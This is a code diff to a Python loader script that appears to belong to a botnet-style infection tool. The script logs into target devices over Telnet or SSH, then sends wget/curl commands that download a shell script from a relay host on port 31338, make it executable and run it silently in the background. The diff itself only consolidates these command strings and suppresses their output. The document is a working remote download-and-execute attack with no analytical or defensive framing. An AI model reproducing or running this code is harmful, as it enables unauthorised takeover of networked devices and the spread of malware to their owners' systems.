@@ -11,7 +11,7 @@ with open(filename, 'r') as file:
     json_data = json.load(file)
 Host_IP = json_data['RelayIP']
 targetIP = json_data['targetIP']
-Host_IP+=":31338"
+Host_IP += ":31338"
 
 
 def doTelnetLogin(ip, port, user, pass_):
@@ -51,19 +51,15 @@ def doTelnetLogin(ip, port, user, pass_):
                     cmd = "wget http://"+Host_IP+"/wget_download_exec.sh"  #test host ip => http://192.168.1.97:31338
                     cmd += " || "
                     cmd += "curl http://"+Host_IP+"/curl_download_exec.sh -o curl_download_exec.sh"
-                    cmd1="chmod +x wget_download_exec.sh"
-                    cmd1 +=" || "
-                    cmd1 += "chmod +x curl_download_exec.sh"
-                    cmd2="sh ./wget_download_exec.sh"
-                    cmd2+=" || "
-                    cmd2+="sh ./curl_download_exec.sh"
+                    cmd1="chmod +x wget_download_exec.sh || chmod +x curl_download_exec.sh"
+                    cmd2="(sh ./wget_download_exec.sh || sh ./curl_download_exec.sh) > /dev/null 2>&1 &"
                     tn.write((cmd+"\n").encode('ascii'))  
                     response = tn.read_until(b"#", 1)
                     print(str(response))
                     tn.write((cmd1+"\n").encode('ascii'))  
                     response = tn.read_until(b"#", 1)
                     print(str(response))
-                    tn.write((cmd2+" & \n").encode('ascii'))  
+                    tn.write((cmd2+"\n").encode('ascii'))  
                     response = tn.read_until(b"#", 1)
                     print("Exec command "+cmd +"--> Successful")                
                     print("[loader] This device is broken. Use Telnet")
@@ -83,9 +79,7 @@ def doSSHLogin(ip, port, user, pass_):
         cmd = "wget http://"+Host_IP+"/wget_download_exec.sh"  #test host ip => http://192.168.1.97:31338
         cmd += " || "
         cmd += "curl http://"+Host_IP+"/curl_download_exec.sh -o curl_download_exec.sh"
-        cmd1="chmod +x wget_download_exec.sh"
-        cmd1 +=" || "
-        cmd1 += "chmod +x curl_download_exec.sh"
+        cmd1="chmod +x wget_download_exec.sh || chmod +x curl_download_exec.sh"
         cmd2="(sh ./wget_download_exec.sh || sh ./curl_download_exec.sh) > /dev/null 2>&1 &"
         stdin, stdout, stderr = client.exec_command(cmd)
         output = stdout.read().decode('utf-8')
